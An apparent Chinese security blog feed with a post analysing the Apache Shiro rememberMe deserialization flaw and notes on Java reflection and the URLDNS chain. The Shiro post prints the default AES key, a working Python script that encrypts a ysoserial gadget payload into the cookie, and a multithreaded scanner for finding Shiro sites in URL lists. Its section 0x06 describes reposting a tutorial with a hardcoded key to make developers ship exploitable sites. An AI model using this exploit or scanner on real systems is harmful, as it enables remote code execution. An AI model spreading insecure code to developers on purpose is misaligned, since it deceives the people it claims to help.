<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://www.svenbeast.com</id>
    <title>攻城肾透shi | sv3nbeast</title>
    <updated>2021-01-11T14:16:00.290Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://www.svenbeast.com"/>
    <link rel="self" href="https://www.svenbeast.com/atom.xml"/>
    <subtitle>Let&apos;s start learning，不在平静中灭亡~  </subtitle>
    <logo>https://www.svenbeast.com/images/avatar.png</logo>
    <icon>https://www.svenbeast.com/favicon.ico</icon>
    <rights>All rights reserved 2021, 攻城肾透shi | sv3nbeast</rights>
    <entry>
        <title type="html"><![CDATA[【教科书】Shiro反序列化利用分析及其他一些有趣的知识]]></title>
        <id>https://www.svenbeast.com/post/jiao-ke-shu-shiro-fan-xu-lie-hua-li-yong-fen-xi-ji-qi-ta-yi-xie-you-qu-de-zhi-shi/</id>
        <link href="https://www.svenbeast.com/post/jiao-ke-shu-shiro-fan-xu-lie-hua-li-yong-fen-xi-ji-qi-ta-yi-xie-you-qu-de-zhi-shi/">
        </link>
        <updated>2021-01-11T13:33:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="0x00-背景">0x00 背景</h3>
<p>文章记录了分析shiro反序列化漏洞的思路和过程，漏洞用的次数挺多，感觉不认真走一遍分析还是缺点什么。排版是按照从issues中获得信息一步步分析的思路进行排版的， 不太专业  见谅 ┭┮﹏┭┮</p>
<p>友情提示：文章写的感觉比较亲民，理论上有一些其他语言的基础都可以阅读，比较倾向于写的详细一些这种写法(废话较多，忽略即可)，大概是看帖按着步骤走跟着思考大概自行理解的程度。</p>
<h3 id="0x01-梦开始的地方">0x01 梦开始的地方</h3>
<p>一切都要从官方shiro的某个人提出的问题描述开始说起 ~     下图为谷歌翻译结果</p>
<p>url: https://issues.apache.org/jira/browse/SHIRO-550</p>
<figure data-type="image" tabindex="1"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004803519.png" alt="image-20210107004803519" loading="lazy"></figure>
<p>通过描述可知：</p>
<ul>
<li>
<ol>
<li>shiro &lt;= 1.2.4 存在反序列化漏洞</li>
</ol>
</li>
<li>
<ol start="2">
<li>shiro的CookieRememberMeManager类里对漏洞参数rememberMe进行序列化，加密等操作，我理解成这个类和这个漏洞有关系，可以当成入口点</li>
</ol>
</li>
<li>
<ol start="3">
<li>shiro对每次访问都会用到&quot;记住我&quot;的功能进行以下操作：</li>
</ol>
<ul>
<li>检索<code>rememberMe</code> cookie的值     //cookie中是否有这个参数</li>
<li>Base 64解码    //对参数的值进行解码</li>
<li>使用AES解密   //对参数的值再进行解密</li>
<li>使用Java序列化（<code>ObjectInputStream</code>）反序列化。  //对解出的参数的值进行反序列化</li>
</ul>
</li>
<li>
<ol start="4">
<li>源代码存在默认的AES加密密钥，所有能够查看源代码的人都可以知道默认密钥是什么</li>
</ol>
</li>
</ul>
<p>以此确定一个需要通过Debug代码来达成的大概目的：</p>
<ul>
<li>通过<code>控制rememberMe参数的值</code>传输<code>加密</code>好的<code>恶意序列化payload</code>，成功让shiro进行解密到反序列化的步骤就可以达到执行命令的目的
<ul>
<li>
<ol>
<li><strong>如何控制rememberMe参数的值</strong></li>
</ol>
</li>
<li>
<ol start="2">
<li><strong>如何对payload进行加密</strong></li>
</ol>
</li>
<li>
<ol start="3">
<li><strong>根据加密方法对生成恶意序列化payload进行加密构造利用工具</strong></li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 id="0x02-科普时间">0x02 科普时间</h3>
<ul>
<li>
<p>AES加密算法：属于对称加密算法，意思就是加密和解密用相同的密钥</p>
<ul>
<li>
<p>加密过程：</p>
<p>明文 --&gt; AES加密函数 + 密钥位数(128/192.256)  + iv(初始化向量) + 密钥(key) + 模式(CBC和GCM等) + padding(填充方式)--&gt; 密文</p>
</li>
</ul>
</li>
<li>
<p>IDEA的Debug按钮功能：</p>
<p>Step Over : 单步执行,遇到方法直接获得返回值而不会进入<br>
Step Into : 单步执行,遇到方法会进入方法，不会进入jdk实现的方法中<br>
Force Step Into : 可以进入任何的方法，比如jdk,jar包<br>
Step Out : 在方法内会直接获得返回值跳出该方法<br>
Run To Cursor : 让程序运行到鼠标所在的位置<br>
Drop Frame : 返回上一步，摧毁当前方法获得的值<br>
Resume Program : 运行至下一个断点所在位置</p>
</li>
</ul>
<h3 id="0x03-分析独白">0x03 分析独白</h3>
<h4 id="1-环境配置">1. 环境配置</h4>
<p>研究的前提自然是要搭建好环境</p>
<p>下载shiro的漏洞环境，这里使用war包，放在tomcat的webapps里，启动tomcat，然后war包自动解析成文件夹，使用IDEA打开此文件夹</p>
<p>顺便讲一下IDEA配置调试shiro</p>
<pre><code>Run -&gt; Edit Configurations -&gt; 点击+号添加TomcatServer(Local) -&gt; Server中配置Tomcat路径 -&gt; 选择JRE版本 -&gt;Deployment中点击+号添加tomcat里生成的shiro文件夹 -&gt; 点击Apply
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004815840.png" alt="image-20210107004815840" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004826744.png" alt="image-20210107004826744" loading="lazy"></figure>
<p>运行起来</p>
<figure data-type="image" tabindex="4"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004835911.png" alt="image-20210107004835911" loading="lazy"></figure>
<h4 id="2-分析过程">2. 分析过程</h4>
<p>首先<strong>第一个目的</strong>是控制rememberMe参数的值,先找到参数所在位置，对环境的功能先正常使用一遍</p>
<p>当我访问http://localhost:8080/shiro_web_1_2_4_war/login.jsp  登录时勾选Remember Me后，cookie中出现rememberMe参数，而shiro每次都会对cookie中的rememberMe来进行解密后反序列化操作来确定访问者权限，所以直接在cookie传输rememberMe参数就可以控制shiro反序列化的值</p>
<figure data-type="image" tabindex="5"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004847419.png" alt="image-20210107004847419" loading="lazy"></figure>
<p><strong>第二个目的</strong>是获得加密解密的方法，以此来自行加密解密恶意payload进行传输</p>
<p>反编译此漏洞环境中的shiro组件jar包</p>
<p><code>选中shiro-core-1.2.4.jar -&gt; 右键 -&gt; Add as Library -&gt; ok</code></p>
<p><code>选中shiro-web-1.2.4.jar -&gt; 右键 -&gt; Add as Library -&gt; ok</code></p>
<figure data-type="image" tabindex="6"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004855138.png" alt="image-20210107004855138" loading="lazy"></figure>
<p>IDEA中按两次shift 搜索咱们前面准备当做入口点的CookieRememberMeManager类，按着函数列表查看后并未发现有关加密的信息，so跟进父类AbstractRememberMeManager去看一下</p>
<figure data-type="image" tabindex="7"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004908000.png" alt="image-20210107004908000" loading="lazy"></figure>
<p>进入此类可以发现一个很明显的key，根据参数名<code>DEFAULT_CIPHER_KEY_BYTES</code>也可以断定是AES加密中所使用的密钥，同时确实是直接写入了代码中，符合上面通过描述可知的AES密钥硬编码在源代码中的条件</p>
<figure data-type="image" tabindex="8"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004916235.png" alt="image-20210107004916235" loading="lazy"></figure>
<p>这里我在AbstractRememberMeManager类函数名为encrypt(加密)中下了断点，然后在web端进行登录操作，开始debug，运行至encrypt函数传入参数serialized，然后点击Drop Frame返回上个方法发现传入的serialized的值是我刚才web端登录的用户名root序列化后的数据，根据运行步骤函数名猜测流程是shiro验证完了登录的账号密码，然后根据用户名生成序列化数据准备进行加密了</p>
<!--在这里下断点的原因：1.习惯先看类的函数列表，这个函数名作用很明显emm。。  2.因为已知每次访问shiro会对rememberMe进行解密来得知对应的访问用户，所以对应的是用户登录时shiro会根据登录用户进行加密并赋值给rememberMe参数-->
<figure data-type="image" tabindex="9"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004925147.png" alt="image-20210107004925147" loading="lazy"></figure>
<figure data-type="image" tabindex="10"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004931833.png" alt="image-20210107004931833" loading="lazy"></figure>
<pre><code class="language-java">再次敲黑板
  
Debug按钮功能：
  Step Over : 单步执行,遇到方法直接获得返回值而不会进入
  Step Into : 单步执行,遇到方法会进入方法，不会进入jdk实现的方法中
  Force Step Into : 可以进入任何的方法，比如jdk,jar包
  Step Out : 在方法内会直接获得返回值跳出该方法
  Run To Cursor : 让程序运行到鼠标所在的位置
  Drop Frame : 返回上一步，摧毁当前方法获得的值
  Resume Program : 运行至下一个断点所在位置
</code></pre>
<p>在调试的变量框里看到加密的设置为AES加密，模式为CBC，128位，填充方式为PKCS5Padding</p>
<figure data-type="image" tabindex="11"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004940817.png" alt="image-20210107004940817" loading="lazy"></figure>
<p>继续Force Step Into(下一步)，进入cipherService.encrypt的方法中，跳到了JcaCipherService类中的encrypt方法中,方法中有个ivBytes变量，值是随机生成的16个字节，然后跳到了此类中的另一个encrypt方法，就是图片框中下面那个encrypt方法</p>
<pre><code>【+】return this.encrypt(plaintext, key, ivBytes, generate);

plaintext 为 序列化的用户名
key 为 DEFAULT_CIPHER_KEY_BYTES 就是上面base64解码的那个密钥
ivBytes 为 随机生成的长度为16的字节
generate 为 true
</code></pre>
<figure data-type="image" tabindex="12"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004950559.png" alt="image-20210107004950559" loading="lazy"></figure>
<p>跳入的encrypt方法，不清楚java的一些方法作用一定要看图片中的备注，这个方法就是真正的生成加密结果的地方，我会描述的详细一点，因为我是垃圾不写就忘</p>
<figure data-type="image" tabindex="13"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107004958406.png" alt="image-20210107004958406" loading="lazy"></figure>
<p>继续Step Over(下一步)，就回到了梦开始(下的断点)的地方 ~，value变量的值就是上面步骤的output变量的值</p>
<figure data-type="image" tabindex="14"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107005007305.png" alt="image-20210107005007305" loading="lazy"></figure>
<p>继续使用Force Step Into(下一步)和Step Out(在方法内直接获得返回值并跳到下一步)调试，盯着存储着加密结果的变量，遇到没有对此变量操作的直接获得返回值下一步，最终到了CookieRememberMeManager类中的rememberSerializedIdentity方法又对存储着加密结果的变量进行了一次base64加密，然后赋值到了cookie的rememberMe参数中，到此加密过程结束。</p>
<figure data-type="image" tabindex="15"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107005015379.png" alt="image-20210107005015379" loading="lazy"></figure>
<p><strong>最终总结加密过程为</strong>：</p>
<p>设定：<strong>密钥</strong> = kPH+bIxk5D2deZiIxcaaaA==</p>
<p>1.获得明文 = 正常识序列化用户名后的字节(root)      <!--可以理解为ysoserial生成的payload--></p>
<p>2.以下步骤：</p>
<ul>
<li>
<p>科普知识：正常的AES加密所需参数 = 想加密的字符串 + iv + key + CBC + padding</p>
</li>
<li>
<p>shiro：AES加密 = 想加密的字符串 (<code>明文</code>) + iv(<code>随机生成的长度为16的字节</code>) +  key(<code>base64解码<strong>密钥</strong>的结果</code>) + CBC + PKCS5Padding</p>
</li>
</ul>
<p>3.随机生成的长度为16的字节 + AES加密结果   (就是拼接了一下)</p>
<p>4.base64加密</p>
<p><strong>那么解密过程为</strong>:</p>
<p>设定：<strong>密钥</strong> = kPH+bIxk5D2deZiIxcaaaA==</p>
<p>1.获得密文 = base64解密rememberMe参数传过来的值</p>
<p>2.以下步骤：</p>
<ul>
<li>
<p>科普知识：正常的AES解密所需参数 = 想解密的字符串 + iv + key + CBC</p>
</li>
<li>
<p>shiro：AES解密 = 想解密的字符串(<code>删除密文前16个字节的剩余字节</code>)+iv(<code>密文的前16个字节</code>) + key(<code>base64解码<strong>密钥</strong>的结果</code>) + CBC + PKCS5Padding</p>
</li>
</ul>
<p>3.对解密结果进行反序列化，触发payload</p>
<p>​	在进行第三个目的前看一下最终触发反序列化的地方在哪里，按照加密方法调试过程，在解密方法处添加断点，然后在网页上先登录后，开启调试，运行至decrypt方法停住后进行Force Step Into(下一步)和Step Out(在方法内直接获得返回值并跳到下一步)调试，直到DefaultSerializer的deserialize方法。</p>
<p>​	找到shiro进行序列化和反序列化的代码位置后，可以发现shiro的serialize方法使用ByteArrayOutputStream创建了字节数组缓冲区来存储序列化的字节码，而不是生成落地文件，回到deserialize方法，同样生成缓冲区存储传过来的序列化字节，进行反序列化，并最终运行了readObject方法，如果反序列化的是我们的payload，到这里就执行命令了。</p>
<figure data-type="image" tabindex="16"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107005025077.png" alt="image-20210107005025077" loading="lazy"></figure>
<p><strong>第三个目的</strong>是构造脚本进行利用，先将shiro的加密过程和解密过程写出来(高版本GCM模式的脚本没写，小改一下就是了)</p>
<pre><code class="language-python">def encode(target):
    iv   =  uuid.uuid4().bytes  #用好看的方式随机生成16字节
    # iv = bytes('1111111111111111',encoding='utf-8')
    realkey = base64.b64decode(key)  #解密key
    mode = AES.MODE_CBC
    pad = lambda s: s + ((16 - len(s) % 16) * chr(16 - len(s) % 16)).encode() #CBC模式要求明文长度要是16的倍数，位数不足16位的添加字节补充
    resultAES = AES.new(realkey,mode,iv)
    nice = resultAES.encrypt(pad(target))
    nice = iv + nice
    nice = base64.b64encode(nice)

    print(&quot;加密目标:\n&quot; + str(target) + &quot;\n\n加密结果:\n&quot; + nice.decode(&quot;utf-8&quot;) + &quot;\n&quot;)


def decode(target):
    
    realkey = base64.b64decode(key)  #解密key
    targetText = base64.b64decode(target) # 想要解密的密文

    iv = targetText[0:16]
    realText = targetText[16:]
    mode = AES.MODE_CBC

    resultAES = AES.new(realkey, mode, iv)# 初始化AES参数
    nice = (resultAES.decrypt(realText)).decode('utf-8', errors='ignore') #解密密文并设置忽略一些错误防止报错
    print(&quot;\n解密目标:\n&quot; + target + &quot;\n\n解密结果:\n&quot; + nice + &quot;\n&quot;)
</code></pre>
<p>然后是加上 使用ysoserial生成的java存在反序列化漏洞依赖库的payload，一个利用代码模子就出来了，优秀的工具已经有很多了，就不一一列举了，我的to do里是有整合利用链的想法的，不过yso的cb利用链还在努力自闭中~ 因为我根本就不会java呀 (#<sup>.</sup>#) ，暂时学习了一些需要的前置知识，然后分析了最简单的URLDNS，有时间我整理一下学习的笔记在水一下。</p>
<pre><code class="language-python">from Crypto.Cipher import AES
import base64,uuid
import subprocess

decodeTarget = ''
encodeTarget = 'root'
key = 'kPH+bIxk5D2deZiIxcaaaA=='



def encode(target):
    iv   =  uuid.uuid4().bytes  #用好看的方式随机生成16字节
    # iv = bytes('1111111111111111',encoding='utf-8')
    realkey = base64.b64decode(key)  #解密key
    mode = AES.MODE_CBC
    pad = lambda s: s + ((16 - len(s) % 16) * chr(16 - len(s) % 16)).encode() #CBC模式要求明文长度要是16的倍数，位数不足16位的添加字节补充
    resultAES = AES.new(realkey,mode,iv)
    nice = resultAES.encrypt(pad(target))
    nice = iv + nice
    nice = base64.b64encode(nice)

    print(&quot;加密目标:\n&quot; + str(target) + &quot;\n\n加密结果:\n&quot; + nice.decode(&quot;utf-8&quot;) + &quot;\n&quot;)


def decode(target):
    
    realkey = base64.b64decode(key)  #解密key
    targetText = base64.b64decode(target) # 想要解密的密文

    iv = targetText[0:16]
    realText = targetText[16:]
    mode = AES.MODE_CBC

    resultAES = AES.new(realkey, mode, iv)# 初始化AES参数
    nice = (resultAES.decrypt(realText)).decode('utf-8', errors='ignore') #解密密文并设置忽略一些错误防止报错
    print(&quot;\n解密目标:\n&quot; + target + &quot;\n\n解密结果:\n&quot; + nice + &quot;\n&quot;)


popen = subprocess.Popen('java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections10 &quot;sleep-5&quot;', shell=True, stdout=subprocess.PIPE)
file_body = popen.stdout.read()         #读取生成的payload字节码

decode(decodeTarget)
encode(file_body)


</code></pre>
<h3 id="0x04-shiro组件检测">0x04 shiro组件检测</h3>
<p>写的一个检测shiro组件的脚本，速度很快。</p>
<pre><code class="language-python">import requests
import sys,re
import threadpool
#from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings()


def exp(line):
    header={
    'User-agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;',
    'Cookie':'a=1;rememberMe=1'

    }

    check_one=&quot;rememberMe&quot; #场景1
    check_two=&quot;deleteMe&quot; #场景2

    isExist = False

    with open('ScanResult.txt',&quot;a&quot;) as f:
        if 'http' not in line:
            line = 'http://'+line
        try:
            x = requests.head(line,headers=header,allow_redirects=False,verify=False,timeout=6) #场景4
            y = str(x.headers)
            z = checkRe(y) 

            a = requests.head(line,headers=header,verify=False,timeout=6) #场景5
            b = str(a.headers)
            c = checkRe(b) 
            
            if check_one in y or z or check_two in y or c:
                isExist = True

            if isExist:
                print(&quot;[+ &quot;+&quot;!!! 存在shiro: &quot;+&quot;状态码: &quot;+str(x.status_code)+&quot;   url: &quot;+line)
                f.write(line+&quot;\n&quot;)
            else:
                print(&quot;[- &quot;+&quot;不存在shiro  &quot;+&quot;状态码: &quot;+str(x.status_code)+&quot;  url: &quot;+line)

        except Exception as httperror:
            print(&quot;[- &quot;+&quot;目标超时, 疑似不存活: &quot;+&quot;  url: &quot;+line)
            


def checkRe(target): #场景3

    pattern = re.compile(u'^re(.*?)Me') 
    result  = pattern.search(target)
    if result:
        return True
    else:
        return False

def multithreading(funcname, params=[], filename=&quot;ip.txt&quot;, pools=5):
    works = []
    with open(filename, &quot;r&quot;) as f:
        for i in f:
            func_params = [i.rstrip(&quot;\n&quot;)] + params
  
            works.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(funcname, works)

    [pool.putRequest(req) for req in reqs]
    pool.wait()

def main():
    multithreading(exp, [], &quot;url.txt&quot;, 10)  # 默认15线程
    print(&quot;全部check完毕，请查看当前目录下的shiro.txt&quot;)

            
if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<p>判定是否存在shiro的条件:</p>
<ul>
<li>1.发送带有rememberMe=1的cookie，返回http头是否存在rememberMe</li>
<li>2.发送带有rememberMe=1的cookie，返回http头是否存在deleteMe</li>
<li>3.发送带有rememberMe=1的cookie，返回http头是否存在匹配正则<code>^re(.*?)Me</code>的</li>
<li>4.发送带有rememberMe=1的cookie，请求时脚本设置成跟随跳转后检测前两项</li>
<li>5.发送带有rememberMe=1的cookie，请求时脚本设置成不跟随跳转检测前两项</li>
</ul>
<p>一开始写的时候检测条件是检测的rememberMe=deleteMe字符串，因为见过网站返回头是下图这样的(开发祭天)，返回http头是remeberMe=deleteMe 。。就分开检测了字符串，再加了个正则保险下。</p>
<figure data-type="image" tabindex="17"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/image-20210107005041182.png" alt="image-20210107005041182" loading="lazy"></figure>
<p>有的网站会自动跳转到某个路径显示首页，所以设置了跟随跳转和不跟随跳转，没图脑补吧，检测思路是这样的，有的站的shiro组件存在检测还要是登录页输入账号密码登录时的那个路径或者和post提交有关，所以可以再加个post方式请求的判断条件，还可以学爬虫自动输入账号密码post提交这种的判断条件，具体代码就得自行发挥啦</p>
<h3 id="0x05-shiro组件的默认gadget">0x05 shiro组件的默认gadget</h3>
<p>Shiro是开源的，所以shiro的源码在github上可以找到，而开发在开发项目的时候如果通过pom.xml引入shiro时，会自动引入commons-beanutils库，而这个依赖库正是存在反序列化利用的java依赖库之一，并且一一查看后发现shiro版本对应的commons-beanutils库的版本有些许不同</p>
<figure data-type="image" tabindex="18"><img src="http://oss.svenbeast.com/img/20210111182218.png" alt="image-20210111182218133" loading="lazy"></figure>
<p>查看不同版本shiro的pom.xml后总结对应关系为:</p>
<table>
<thead>
<tr>
<th style="text-align:center">Shiro版本</th>
<th style="text-align:center">CB链</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><a href="https://github.com/apache/shiro/releases/tag/shiro-root-1.1.0">shiro-root-1.1.0</a>(不包含)—更早版本</td>
<td style="text-align:center">1.7.0</td>
</tr>
<tr>
<td style="text-align:center">shiro-root-1.1.0(包含)—1.3.2(包含)</td>
<td style="text-align:center">1.8.3</td>
</tr>
<tr>
<td style="text-align:center">1.4.0(包含)—1.4.2(包含)</td>
<td style="text-align:center">1.9.3</td>
</tr>
<tr>
<td style="text-align:center">1.5.0(包含)—<a href="https://github.com/apache/shiro/releases/tag/shiro-root-1.7.0">shiro-root-1.7.0</a>(包含)</td>
<td style="text-align:center">1.9.4</td>
</tr>
</tbody>
</table>
<p>然后又去查看了Github上commons-beanutils项目的pom.xml，从1.8.3开始看的，里面是内置了commons-collections链</p>
<figure data-type="image" tabindex="19"><img src="http://oss.svenbeast.com/img/20210111195002.png" alt="image-20210111195002336" loading="lazy"></figure>
<table>
<thead>
<tr>
<th style="text-align:center">CB链</th>
<th style="text-align:center">CC链</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1.8.3</td>
<td style="text-align:center">3.2.1</td>
</tr>
<tr>
<td style="text-align:center">1.9.3</td>
<td style="text-align:center">3.2.2</td>
</tr>
<tr>
<td style="text-align:center">1.9.4</td>
<td style="text-align:center">3.2.2</td>
</tr>
</tbody>
</table>
<p>所以最终shiro使用漏洞版本1.2.4或其他高版本shiro但开发自己在shiro的配置文件中固定key导致存在漏洞，几率较高存在的gadget大概就是这样，在往下细节划分及gatget的原理还需要继续有时间再学习了</p>
<h3 id="0x06-增加shiro高版本存在漏洞几率-及-增加普通shiro漏洞几率">0x06 增加shiro高版本存在漏洞几率 及 增加普通shiro漏洞几率</h3>
<p>无意间查了一下shiro的一些教学，发现了一个排名靠前的&quot;靠谱教程&quot;，虽然他帖子写的是shiro的1.5.3版本，但是发现后面的自定义代码中固定了key:2AvVhdsgUs0FSA3SDFAdag== ，虽然没按照这个部署过，漏洞能不能成功易利用，但是还是要得多顶顶这个帖子</p>
<figure data-type="image" tabindex="20"><img src="https://oss.svenbeast.com/img/20210111204337.png" alt="image-20210111204337337" loading="lazy"></figure>
<figure data-type="image" tabindex="21"><img src="http://oss.svenbeast.com/img/20210111204854.png" alt="image-20210111204854368" loading="lazy"></figure>
<figure data-type="image" tabindex="22"><img src="http://oss.svenbeast.com/img/20210111204759.png" alt="image-20210111204759496" loading="lazy"></figure>
<p>这个帖子越看越好，写的很详细，一定能帮助青涩开发解决使用shiro的难题，然后想了一下&quot;顺便&quot;复制了一下这个帖子，我又发在了简书里<a href="https://www.jianshu.com/p/3a5a56316523">Shiro整合前后端分离项目(在Web项目中使用shiro)</a> (还改了标题，增加关键词搜索几率)</p>
<p>同时在其中美中不足的地方进行了修改，使整个帖子对开发更加的友好，简单的改了改图片，加了几句话，有条件的师傅也可以再去博客园，CSDN发几篇，让安全从业者多多帮助懵懂的开发使用shiro组件做权限管理制作出更好的java网站，毕竟安全&amp;开发是一家人的呢    （逃</p>
<figure data-type="image" tabindex="23"><img src="http://oss.svenbeast.com/img/20210111205918.png" alt="image-20210111205918318" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Java反序列化的URLDNS链分析学习]]></title>
        <id>https://www.svenbeast.com/post/java-fan-xu-lie-hua-de-urldns-lian-fen-xi-xue-xi/</id>
        <link href="https://www.svenbeast.com/post/java-fan-xu-lie-hua-de-urldns-lian-fen-xi-xue-xi/">
        </link>
        <updated>2020-12-28T07:04:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="0x01-科普时间">0x01 科普时间</h2>
<h3 id="1-产生java反序列化的必备条件">1. 产生java反序列化的必备条件</h3>
<p>当Java应用对用户输入，也就是不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的<code>对象</code>，在产生非预期对象的过程中就有可能造成任意代码执行。</p>
<ul>
<li>
<p>为什么Java反序列化的出现率这么高？</p>
<pre><code class="language-java">因为Java会给用户提供一些公用库，例如commons-collections,commons-beanutils这些库中实现的一些类可以被反序列化用来实现任意代码执行。
WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些应用的反序列化漏洞能够得以利用，就是依靠了commons-collections
</code></pre>
</li>
</ul>
<p>也就是说，<strong>可控的序列化数据 + 公用的java依赖库</strong>是导致Java反序列化的根本条件</p>
<h3 id="2-一些不是基本数据类型的传参">2. 一些不是基本数据类型的传参</h3>
<p>方法中传入的参数类型为<strong>参数类型</strong>，不是int,String这些基本数据类型是啥意思</p>
<p>意思就是设置了一个该类的对象~ 可以直接调用的啦，不需要在实例化了</p>
<pre><code class="language-java">public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}
</code></pre>
<h3 id="3-java的映射map是什么">3. java的映射(Map)是什么</h3>
<p>Map是java提供的一个官方接口，使用的话就是 import java.util.Map;</p>
<p>作用: 给定一个键和一个值，你可以将该值存储在一个 Map 对象。之后，你可以通过键来访问对应的值。</p>
<p>HashMap类是实现Map接口的一个类，实现上行说的那个功能的具体代码</p>
<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1609139452211.png" alt="" loading="lazy"></figure>
<h3 id="4-如何实现类在被反序列化时触发类里的某个方法">4. 如何实现类在被反序列化时触发类里的某个方法</h3>
<p>在序列化和反序列化过程中需要特殊处理的类必须实现具有以下确切签名的特殊方法：</p>
<pre><code class="language-java">private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException;
</code></pre>
<h3 id="5-java反射是什么及个人理解">5. java反射是什么及个人理解。</h3>
<p>反射之中包含了一个「反」字，所以想要解释反射就必须先从「正」开始解释。</p>
<p>一般情况下，我们使用某个类时必定知道它是什么类，是用来做什么的。于是我们直接对这个类进行实例化，之后使用这个类对象进行操作。</p>
<pre><code>Apple apple = new Apple(); //直接初始化，「正射」
apple.setPrice(8999);
</code></pre>
<p>上面这样子进行类对象的初始化，我们可以理解为「正射」。</p>
<p>而反射则是一开始并不知道我要初始化的类对象是什么，自然也无法使用 new 关键字来创建对象了。</p>
<blockquote>
<p>敲黑板了</p>
<p>[推荐阅读顺序一]https://blog.csdn.net/qq_36226453/article/details/82790375<br>
[推荐阅读顺序二]https://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html</p>
</blockquote>
<p><strong>个人理解：</strong></p>
<p><strong>1.就是java把所有的.class文件当做一个class类，想要用先告诉java你要用哪个class类，然后提供一部分方法实现或者说是细化这个功能</strong></p>
<p><strong>2.就是java把class类里所有的方法当做class类一个子类，想要用就用上步创建的你的目标class对象来调用，提供一部分方法实现或者说是细化这个功能</strong></p>
<p><strong>3.就是java把class类里所有的属性(变量)当做一个class类一个子类，想要用就用上上步创建的你的目标class对象来调用，提供一部分方法实现或者说是细化这个功能</strong></p>
<p><strong>4.想要执行目标类的方法要使用Object object = clazz.newInstance(); 先获得一个对象，就是上上上步获得的目标class对象的newInstance()方法获得一个目标class对象的字节码对象，还得用invoke调用，然后有时候还等同于new一个对象，比如序列化时传入writeObject()的也是这个对象(这步纯个人理解，有点迷糊，好吧我是垃圾)</strong></p>
<pre><code class="language-java">我写的学习代码
package com.company;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class ReflexDemo {

    String name = &quot;张三&quot;;
    int age = 18;

    public String ReflexDemo() {
        String result = &quot;name:&quot; + name + &quot; age:&quot; + age;
        return result;
    }

    public String getName(String nameDemo) {
        this.name = nameDemo;
        return name;

    }

    public int getAge(int ageDemo) {
        this.age = ageDemo;
        return age;
    }

    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException {
        /*
            通过反射执行目标类的方法
        */

        //获取Class对象，我理解为java在运行的时候将运行的所有xxxx.class文件当做一个class类，然后用这个方法在这个大个的class类中获得需要使用的类的对象
        Class clazz = Class.forName(&quot;com.company.ReflexDemo&quot;);

        //在上步获得的Class对象里获得里面的getName方法作为目标方法的对象,传入的就是方法名及需要的参数数据类型 (已知想使用的目标方法名)
        Method method = clazz.getMethod(&quot;getAge&quot;, int.class);

        //在上上步获得Class对象获得XXX，就当获得class对象的执行代码的字节码？不知道这步叫啥，我就当成是固定格式了，有的人还会先用getConstructor()方法在用newInstance()，查的时候也说newInstance是获得构造方法的，但是不是构造方法也能用啊，不清楚
        Object object = clazz.newInstance();

        //用获得目标方法的对象method使用invoke()方法执行此方法，传入的是目标方法的对象和需要的参数
        System.out.println(method.invoke(object,15));


        /*
            通过反射修改目标类的变量
        */

        Method methodTwo = clazz.getMethod(&quot;ReflexDemo&quot;);
        System.out.println(&quot;未修改前:&quot; + methodTwo.invoke(object));

        Field field = clazz.getDeclaredField(&quot;age&quot;); //获得想要修改的变量名对象
        field.setAccessible(true); //设置为允许访问
        field.set(object,8); //修改age变量的值为8

        System.out.println(&quot;已修改后:&quot; + methodTwo.invoke(object));

    }
}
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://www.svenbeast.com/post-images/1609139725146.png" alt="" loading="lazy"></figure>
<ul>
<li>本文用到java反射相关的方法</li>
</ul>
<p><code>getDeclaredFields()</code> :  使用 Class 对象的 getDeclaredFields() 方法则可以获取包括私有属性在内的所有属性</p>
<p><code>forName()</code> : 获取Class对象，我理解为java在运行的时候将运行的所有xxxx.class文件当做一个class类，然后用这个方法在这个大个的class类中获得需要使用的类的Class对象</p>
